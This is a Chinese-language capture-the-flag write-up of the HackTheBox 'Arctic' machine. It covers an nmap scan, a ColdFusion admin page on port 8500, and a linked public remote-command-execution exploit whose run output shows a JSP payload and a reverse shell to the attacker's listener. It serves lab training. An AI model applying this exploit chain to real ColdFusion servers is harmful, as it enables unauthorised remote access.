# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/htb/Arctic]
└─# nmap -Pn -sV 10.10.10.11 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 10:26 EST
Nmap scan report for 10.10.10.11
Host is up (0.26s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

震惊，连个web服务都没有，一下子有点懵。。
8500端口不太常见，尝试在浏览器上打开，非常慢，但是存在一个文件遍历漏洞

```
Index of /

CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ

```

下面路径是一个cms的登录页面
```
http://10.10.10.11:8500/CFIDE/administrator/
```

看title上的cms名字：```ColdFusion```

在谷歌找了几个这个cms的exp，找到了这个[Remote Command Execution](https://www.exploit-db.com/exploits/50057)

下载到本地，修改本地ip和端口

执行攻击：
```
rinting some information for debugging...
lhost: 10.10.14.6
lport: 4444
rhost: 10.10.10.11
rport: 8500
payload: 7ed641ce03ea4eaa92aca6d9ef4c60ab.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.11] 49510

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>

```

拿到了初始shell。。

